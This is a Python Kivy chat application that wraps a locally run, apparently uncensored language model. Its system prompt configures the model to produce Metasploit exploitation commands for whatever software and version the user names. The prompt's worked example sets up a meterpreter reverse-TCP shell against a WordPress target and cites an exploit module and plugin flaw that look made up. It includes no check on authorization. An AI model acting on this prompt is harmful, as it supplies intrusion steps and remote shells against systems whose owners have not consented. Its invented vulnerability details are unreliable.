import requests 
import json
from mem0 import MemoryClient
import io
from pydub import AudioSegment
from pydub.playback import play
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.image import Image
from kivy.uix.textinput import TextInput
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.behaviors import ButtonBehavior
from kivy.graphics import Color, Rectangle
from kivy.clock import Clock
import pyperclip
from kivy.core.window import Window
import threading

# Optional: Set window size for better visibility during development
Window.size = (800, 600)

class KeygenButton(ButtonBehavior, Label):
    def __init__(self, **kwargs):
        super(KeygenButton, self).__init__(**kwargs)
        self.font_size = 16
        self.size_hint = (None, None)
        self.size = (120, 40)
        self.bold = True
        self.color = (1, 1, 1, 1)  # Default text color
        self.background_color = (0, 0, 0, 1)  # Default background color

        # Add canvas instructions for background color
        with self.canvas.before:
            self.bg_color = Color(*self.background_color)
            self.rect = Rectangle(pos=self.pos, size=self.size)
        
        # Bind position and size to update the rectangle
        self.bind(pos=self.update_rect, size=self.update_rect)

    def update_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

    def on_press(self):
        self.bg_color.rgb = (1, 0, 0)  # Change background to red on press

    def on_release(self):
        self.bg_color.rgb = (0, 0, 0)  # Revert background to black on release

class MSFChatApp(App):
    def build(self):
        try:
            # Initialize the main layout
            self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
            
            # Initialize user context and client
            self.user_id = "default_user"
            self.user_context = {}
            self.client = MemoryClient(api_key="m0-Mem0_API_Key")

            # Header Image
            header = Image(source='header.png', size_hint=(1, 0.2))
            self.layout.add_widget(header)

            # Chat Interface with ScrollView
            self.chat_content = GridLayout(cols=1, size_hint_y=None, padding=10, spacing=10)
            self.chat_content.bind(minimum_height=self.chat_content.setter('height'))
            self.chat_window = ScrollView(size_hint=(1, 0.6), do_scroll_x=False)
            self.chat_window.add_widget(self.chat_content)
            self.layout.add_widget(self.chat_window)

            # Input and Button Bar
            input_box = BoxLayout(orientation='horizontal', size_hint=(1, 0.2), spacing=10)
            self.user_input = TextInput(size_hint=(0.7, 1), multiline=False, hint_text="Type your message here...")
            input_box.add_widget(self.user_input)

            # SEND Button
            send_button = KeygenButton(text='SEND')
            send_button.bind(on_release=self.on_send)
            input_box.add_widget(send_button)

            # CLEAR Button
            clear_button = KeygenButton(text='CLEAR')
            clear_button.bind(on_release=self.on_clear)
            input_box.add_widget(clear_button)

            # COPY Button
            copy_button = KeygenButton(text='COPY')
            copy_button.bind(on_release=self.copy_last_ai_message)
            input_box.add_widget(copy_button)

            self.layout.add_widget(input_box)

            return self.layout

        except Exception as e:
            print(f"Error in build method: {e}")
            return BoxLayout()  # Return an empty layout to prevent crashing

    def on_send(self, instance):
        prompt = self.user_input.text
        if prompt.strip():
            self.append_message("User", prompt)
            self.generate(self.user_id, prompt)
            self.user_input.text = ""

    def on_clear(self, instance):
        """
        Clears all AI messages from the chat content, regardless of their labeling.
        """
        # Define all possible prefixes that identify AI messages
        ai_prefixes = ["AI:", "assistant:"]  # Add any other prefixes used for AI messages

        # Iterate over a copy of the children list to avoid modification during iteration
        for widget in self.chat_content.children[:]:
            if isinstance(widget, BoxLayout):
                for child in widget.children:
                    if isinstance(child, Label):
                        text = child.text.lower()  # Case-insensitive comparison
                        if any(text.startswith(prefix.lower()) for prefix in ai_prefixes):
                            self.chat_content.remove_widget(widget)
                            break  # Move to the next widget after removing the current one
            elif isinstance(widget, Label):
                text = widget.text.lower()
                if any(text.startswith(prefix.lower()) for prefix in ai_prefixes):
                    self.chat_content.remove_widget(widget)


    def append_message(self, role, message):
        if role == "AI":
            # Create a BoxLayout to center AI messages
            ai_box = BoxLayout(orientation='horizontal', size_hint_y=None, padding=10, spacing=10)
            ai_label = Label(
                text=f"{role}: {message}",
                size_hint=(0.8, None),
                halign='left',
                valign='middle',
                text_size=(self.chat_window.width * 0.8, None),
                color=(0, 0.75, 1, 1)  # Updated color
            )
            # Bind texture_size to dynamically adjust height
            ai_label.bind(texture_size=lambda instance, size: setattr(instance, 'height', size[1]))
            # Bind width to update text_size dynamically on window resize
            ai_label.bind(width=lambda *args: setattr(ai_label, 'text_size', (self.chat_window.width * 0.8, None)))
            ai_box.add_widget(Label(size_hint=(0.1, None), height=ai_label.height))  # Left Spacer
            ai_box.add_widget(ai_label)
            ai_box.add_widget(Label(size_hint=(0.1, None), height=ai_label.height))  # Right Spacer
            ai_box.height = ai_label.height + 20  # Adjust height based on text

            # Add AI box to chat content
            self.chat_content.add_widget(ai_box)
            
            # Debug Statement
            print(f"AI Label Height: {ai_label.height}, Texture Size: {ai_label.texture_size}")
        else:
            # User messages aligned to the left
            user_label = Label(
                text=f"{role}: {message}",
                size_hint=(1, None),
                halign='left',
                valign='middle',
                text_size=(self.chat_window.width * 0.9, None),
                color=(0, 0, 0, 1)  # Black text for user messages
            )
            # Bind texture_size to dynamically adjust height
            user_label.bind(
                texture_size=lambda instance, size: setattr(instance, 'height', size[1])
            )
            user_label.height = user_label.texture_size[1]
            self.chat_content.add_widget(user_label)
            
            # Debug Statement
            print(f"User Label Height: {user_label.height}, Texture Size: {user_label.texture_size}")
        
        # Scroll to the latest message
        Clock.schedule_once(lambda dt: self.chat_window.scroll_to(self.chat_content.children[-1]), 0.1)

    def play_audio_from_stream(self, output_text):
        audio_data = self.get_tts_stream(output_text)
        if audio_data:
            audio = AudioSegment.from_file(io.BytesIO(audio_data), format="wav")
            play(audio)
        else:
            print("Failed to get the TTS stream.")

    def get_tts_stream(self, output_text):
        base_url = "http://localhost:8020/tts_stream"
        params = {
            "text": output_text,
            "speaker_wav": "calm_female",
            "language": "en"
        }
        try:
            response = requests.get(base_url, params=params, stream=True)
            response.raise_for_status()
            return response.content
        except requests.RequestException as e:
            print(f"Error during TTS request: {e}")
            return None

    def copy_last_ai_message(self, instance):
        # Find the last AI message in the chat content and copy it
        last_ai_message = None
        for widget in self.chat_content.children:
            if isinstance(widget, BoxLayout):
                for child in widget.children:
                    if isinstance(child, Label) and child.text.startswith("AI:"):
                        last_ai_message = child.text
                        break
            elif isinstance(widget, Label) and widget.text.startswith("AI:"):
                last_ai_message = widget.text
            if last_ai_message:
                break

        if last_ai_message:
            pyperclip.copy(last_ai_message.replace("AI: ", ""))
            print("Copied AI message:", last_ai_message)
        else:
            print("No AI message found to copy.")

    def generate(self, user_id, prompt):
        # Run the generate function in a separate thread to keep the UI responsive
        threading.Thread(target=self.perform_generate, args=(user_id, prompt)).start()

    def perform_generate(self, user_id, prompt):
        context = self.user_context.get(user_id, "")
        context += f"User: {prompt}\n"
        user_input = context
        user_message = {"role": "user", "content": user_input}
        self.client.add([user_message], user_id="ollama")

        api_url = "http://localhost:11434/api/chat"
        headers = {"Content-Type": "application/json"}
        payload = {
            "model": "dolphin-llama3:latest",
            "messages": [
                {"role": "system", "content": """You are an AI assistant trained to generate Metasploit commands for vulnerability exploitation. Your task is to analyze the provided target information and use your knowledge of Metasploit to suggest potential exploit modules and commands that can be used against the target. 

Instructions:
1. Identify the target software and its version (e.g., WordPress 5.2.4).
2. Based on the version information, determine possible vulnerabilities that could be exploited.
3. Provide specific Metasploit commands to set up and execute the exploit.

Target Information:
- Software: {software_name}
- Version: {software_version}

Analyze the information and generate a Metasploit command example for exploitation:
- List relevant Metasploit modules and explain what each does.
- Provide the steps to execute the command, including setting the payload and other options.

Example:
Input: 
Software: WordPress
Version: 5.2.4

Output:
1. Vulnerability Analysis:
- Detected vulnerability: Unauthenticated Remote Code Execution (RCE) exploit in WordPress 5.2.4 due to a flaw in XYZ plugin.
- Exploit module: `exploit/unix/webapp/wp_5_2_4_rce`

2. Metasploit Commands:
- `use exploit/unix/webapp/wp_5_2_4_rce`
- `set RHOSTS <target IP>`
- `set RPORT 80`
- `set TARGETURI /wp-admin`
- `set PAYLOAD php/meterpreter/reverse_tcp`
- `set LHOST <your IP>`
- `set LPORT 4444`
- `exploit`

Note: The above steps are based on known vulnerabilities in WordPress 5.2.4. Always confirm the availability of an exploit module and adapt commands accordingly."""
                },
                {"role": "user", "content": context}
            ]
        }
        try:
            response = requests.post(api_url, json=payload, headers=headers)
            response.raise_for_status()

            # Assuming the response is in JSON Lines format
            lines = response.text.strip().split('\n')
            combined_response = ""
            for line in lines:
                try:
                    data = json.loads(line)
                    if 'message' in data and 'content' in data['message']:
                        combined_response += data['message']['content']
                except json.JSONDecodeError:
                    continue

            context += f"AI: {combined_response.strip()}\n"
            self.user_context[user_id] = context

            ai_output = combined_response.strip()
            Clock.schedule_once(lambda dt: self.update_ui_with_ai_response(ai_output), 0.1)

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            Clock.schedule_once(lambda dt: self.append_message("Error", "Failed to get AI response."), 0.1)

    def update_ui_with_ai_response(self, ai_output):
        self.append_message("AI", ai_output)
        self.play_audio_from_stream(ai_output)

if __name__ == '__main__':
    MSFChatApp().run()
